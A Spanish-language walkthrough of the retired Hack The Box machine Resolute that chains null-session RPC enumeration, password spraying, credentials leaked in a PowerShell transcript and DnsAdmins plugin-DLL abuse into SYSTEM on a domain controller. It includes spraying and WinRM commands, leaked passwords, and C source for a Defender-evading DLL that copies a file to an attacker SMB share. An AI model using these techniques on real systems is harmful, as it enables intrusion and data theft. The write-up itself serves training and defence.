---
title: "HTB: Resolute · de RPC anónimo a Domain Admin vía DnsAdmins"
date: 2026-09-10
draft: false
tags: ["hackthebox", "active-directory", "windows", "escalada-privilegios", "dnsadmins"]
summary: "Una máquina Windows retirada de dificultad media que encadena las cuatro formas más comunes en que fugan los Active Directory reales: enumeración RPC anónima, una contraseña en la descripción de un usuario, reutilización de credenciales y una contraseña en texto plano en un transcript de PowerShell, terminando en una shell SYSTEM a través del grupo DnsAdmins."
---

## Resumen

Resolute es una máquina Windows retirada de dificultad media de Hack The Box, merece la pena documentarla porque cada paso corresponde directamente a una mala configuración que te encuentras en entornos de AD reales, no a un CTF artificial. El camino es:

1. **Enumeración RPC anónima** que filtra la lista completa de usuarios y una contraseña guardada en el campo de descripción de una cuenta.
2. **Password spraying** de esa credencial contra todo el dominio, que da acceso a otro usuario (`melanie`).
3. Una **credencial en texto plano en un transcript de PowerShell** que permite el movimiento lateral a `ryan`.
4. `ryan` es miembro de **DnsAdmins**, que permite cargar una DLL arbitraria en el servicio DNS, que se ejecuta como SYSTEM en el Controlador de Dominio.

Objetivo: `10.129.96.155`, un Controlador de Dominio Windows Server 2016 del dominio `megabank.local`.

## Enumeración

Empezamos con un escaneo completo de puertos TCP, más scripts por defecto y detección de versiones:

```bash
nmap -sC -sV -p- -oN nmap-resolute.txt 10.129.96.155
```

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf       .NET Message Framing
...
```

El fingerprint no deja ninguna dudas: Kerberos (88), LDAP (389/3268), SMB (445), DNS (53) y WinRM (5985) todos abiertos. Es un **Controlador de Dominio**. Que WinRM esté abierto conviene apuntarlo pronto, si conseguimos credenciales válidas de un usuario del grupo *Remote Management Users*, tenemos shell interactivo.

### Por qué comprobar el acceso anónimo primero

Antes de tirar de exploits o de fuerza bruta, lo primero en un objetivo de AD debería de ser saber si hay **acceso anónimo o sesión nula**. Es una de las malas configuraciones más comunes en el mundo real, y muy a menudo filtra usuarios, shares y, como veremos, contraseñas. `enum4linux-ng` agrupa varias técnicas de enumeración SMB/RPC en una sola ejecución:

```bash
enum4linux-ng -A 10.129.96.155
```

Saltan dos cosas. Primero, la sesión nula RPC está permitida:

```
[+] Server allows authentication via username '' and password ''
```

Segundo, esa sesión nula basta para volcar los 27 usuarios del dominio, y uno de ellos tiene una contraseña escrita en texto plano en su descripción:

```
'1111':
  username: marko
  name: Marko Novak
  description: Account created. Password set to Welcome123!
```

Es un hallazgo de manual. Alguien en IT dio una contraseña temporal de alta y la dejó en un sitio que cualquier usuario no autenticado de la red puede leer.

La política de contraseñas del dominio también merece atención:

```
Domain lockout information:
  Lockout threshold: None
```

Sin umbral de bloqueo de cuenta, podemos probar contraseñas contra muchas cuentas sin riesgo de bloquear a nadie. Eso hace seguro el siguiente paso.

## Punto de entrada

`Welcome123!` no funciona directamente para marko:

```bash
netexec smb 10.129.96.155 -u marko -p 'Welcome123!'
# STATUS_LOGON_FAILURE
```

Es lo esperable, las contraseñas de alta como esta suelen reutilizarse en *varias* cuentas nuevas, no solo en una. Así que en vez de probar uno por uno, la probamos contra la lista completa de usuarios. Esto es **password spraying**: una contraseña, muchos usuarios (lo contrario de fuerza bruta), que es precisamente por lo que importa que no haya política de bloqueo.

```bash
netexec smb 10.129.96.155 -u users.txt -p 'Welcome123!' --continue-on-success
```

```
SMB  10.129.96.155  445  RESOLUTE  [+] megabank.local\melanie:Welcome123!
```

Un acierto: **melanie**. Está en *Remote Management Users*, así que tenemos WinRM disponible:

```bash
netexec winrm 10.129.96.155 -u melanie -p 'Welcome123!'
# (Pwn3d!)

evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
```

```
*Evil-WinRM* PS C:\Users\melanie\Documents> type C:\Users\melanie\Desktop\user.txt
02cf8ae2************************ba
```

Flag de usuario capturada.

## Movimiento lateral a ryan

`melanie` no tiene nada interesante en cuanto a privilegios (`whoami /all` solo muestra grupos por defecto), y su directorio personal no tiene historial de PowerShell. La carpeta `C:\Users` muestra un perfil `Administrator` y otro `ryan` que no podemos leer directamente.

La pista llega al listar la raíz de `C:\` con `-Force`, para revelar carpetas ocultas:

```powershell
dir C:\ -Force
```

```
d--h--  12/3/2019  6:32 AM   PSTranscripts
```

`PSTranscripts` no es una carpeta estándar de Windows, está oculta y se añadió a mano. La transcripción de PowerShell registra sesiones enteras de consola, comandos incluidos. Al escarbar (las subcarpetas también están ocultas, así que `-Recurse -Force`):

```powershell
dir C:\PSTranscripts -Recurse -Force
type "C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt"
```

Dentro del transcript, `ryan` había ejecutado un comando `net use` con su contraseña en la propia línea, capturada literalmente por la transcripción:

```
CommandInvocation(Invoke-Expression): ...
value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123! ..."
```

Segundo hallazgo de manual: **transcripción de PowerShell habilitada sin proteger el directorio de transcripts**, exponiendo una credencial en texto plano a cualquier usuario que pueda leer los logs.

La credencial es válida, y ryan también está en *Remote Management Users*:

```bash
netexec winrm 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
# (Pwn3d!)
```

## Escalada de privilegios · DnsAdmins a SYSTEM

Al comprobar los grupos de ryan aparece la clave:

```powershell
whoami /groups
```

```
MEGABANK\DnsAdmins   Alias   ...   Local Group
```

`ryan` es miembro de **DnsAdmins**. Es una debilidad de diseño muy conocida de Active Directory (documentada públicamente desde 2017): el servicio DNS de Windows corre como **SYSTEM** en el Controlador de Dominio, y los miembros de DnsAdmins pueden configurarlo para cargar una "plugin DLL a nivel de servidor" mediante el ajuste `serverlevelplugindll` sin necesidad de ser admin local. Cuando el servicio DNS se reinicia, carga nuestra DLL y ejecuta su código como SYSTEM.

### Construir una DLL que evada Defender

El enfoque evidente, `msfvenom -p windows/x64/exec ... -f dll`, genera una DLL cuyo shellcode detecta y bloquea silenciosamente el Windows Defender que corre en la máquina. La solución es compilar nosotros una DLL sencilla en C; al no contener shellcode reconocible, pasa por delante de la detección por firmas:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c copy C:\\Users\\Administrator\\Desktop\\root.txt \\\\10.10.14.55\\share\\pwned.txt", SW_HIDE);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

Una nota sobre la elección del payload: esta máquina ejecuta una tarea de limpieza que revierte los cambios periódicamente (añadir ryan a Domain Admins funcionó, pero la pertenencia al grupo (y el propio valor del registro) se reseteaban en un par de minutos). En vez de pelear contra esa carrera, la DLL simplemente exfiltra el flag directamente a un share SMB. Como el fichero aterriza en la máquina atacante en el instante en que se ejecuta la DLL, la limpieza de la máquina da igual.

### Servir la DLL

Alojamos la DLL por SMB para que el DC la descargue. **Detalle importante**: no compartas todo tu directorio personal. Un montaje `.gvfs` dentro de él rompe el manejo de peticiones de impacket y sabotea silenciosamente la entrega de la DLL. Usa una carpeta limpia con solo la DLL:

```bash
mkdir -p ~/smbshare && cp evil.dll ~/smbshare/
sudo impacket-smbserver share ~/smbshare -smb2support
```

### Disparar la carga

Desde la sesión WinRM de ryan, apuntamos el servicio DNS a la DLL y lo reiniciamos:

```powershell
dnscmd.exe /config /serverlevelplugindll \\10.10.14.55\share\evil.dll
sc.exe stop dns
sc.exe start dns
```

Un detalle que me costó tiempo: el servicio DNS solo intenta cargar el plugin cuando el valor del registro **cambia**. Si ya está puesto a la misma ruta (o la tarea de limpieza acaba de borrarlo), un simple reinicio no vuelve a disparar la carga, así que hay que asegurarse de que el valor cambie de verdad antes de reiniciar.

El servidor SMB registra al DC conectándose como `RESOLUTE$` (la cuenta de máquina, es decir SYSTEM) y descargando la DLL. De vuelta en la máquina de ataque:

```bash
cat ~/smbshare/pwned.txt
581da83f************************03
```

Flag de root capturada. Compromiso total del dominio.

## Lecciones

Resolute es valiosa precisamente porque ninguno de sus pasos es exótico, son los errores que aparecen una y otra vez en auditorías reales:

- **El RPC anónimo / sesión nula** debería estar deshabilitado en los controladores de dominio; le entrega gratis toda tu lista de usuarios a un atacante.
- **Nunca guardes contraseñas en atributos de AD** como el campo de descripción, son legibles por cualquier usuario autenticado (aquí, incluso no autenticado).
- **La reutilización de contraseñas de alta** convierte una credencial filtrada en un punto de entrada; las contraseñas temporales deben ser únicas y forzar el cambio en el primer inicio de sesión.
- **La transcripción de PowerShell es un buen control defensivo**, pero el directorio de transcripts debe estar protegido, o se convierte en un almacén de credenciales para el atacante.
- **DnsAdmins equivale a Domain Admin** en un DC. Trata la pertenencia como tier-0 y audítala.

*Los flags están parcialmente ocultos, por convención.*

---

También redacté este ejercicio como un informe de test de intrusión formal, el mismo formato que entregaría a un cliente, con resumen ejecutivo, hallazgos puntuados con CVSS y guía de remediación.

📄 [**Descargar el informe de pentest completo (PDF)**](/reports/Resolute_Pentest_Report/Resolute_Pentest_Report_ES.pdf)
